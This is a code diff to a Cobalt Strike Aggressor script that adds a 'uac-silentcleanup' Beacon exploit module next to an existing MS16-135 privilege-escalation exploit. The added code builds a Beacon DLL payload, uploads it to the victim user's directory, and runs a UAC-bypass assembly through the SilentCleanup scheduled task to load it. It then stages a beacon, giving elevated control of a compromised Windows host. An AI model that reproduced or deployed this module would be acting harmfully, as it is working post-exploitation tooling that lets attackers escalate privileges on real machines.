@@ -334,3 +334,35 @@ sub ms16_135 {
 
 
 beacon_exploit_register("ms16-135", "Win32k Elevation of Privilege (CVE-2016-7255)", &ms16_135);
+
+
+sub silentcleanup_exploit {
+
+	# ackowledge command
+	btask($1, "Tasked Beacon to run BypassUAC via SilentCleanup Scheduled Task", "T1088");
+
+	# Generate the payload, specifying stage archiecture in argument $4
+	if (-is64 $1) {
+		$payload = artifact($2, "dllx64", $null, "x64");
+		$arch = "x64"
+	} else {
+		$payload = artifact($2, "dll", $null, "x86");
+		$arch = "x86"
+	}
+	
+	$user = binfo($1, "user");
+
+	# Upload the DLL
+	bupload_raw($1, "C:\\Users\\" . $user . "\\temp.dll", $payload);
+
+	# Task beacon to run exploit with the path to the dll
+	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup.exe"), "c:\\users\\" . $user . "\\temp.dll,Start");
+
+	# Handle staging for named pipe beacons
+	bstage($1, $null, $2, $arch);
+
+	# Remove file (not working due to process lock)
+	sleep(15 * 1000);
+	#brm($1, "C:\\Users\\" . $user . "\\temp.dll");
+}
+beacon_exploit_register("uac-silentcleanup", "Scheduled task uac bypass using silentcleanup", &silentcleanup_exploit);
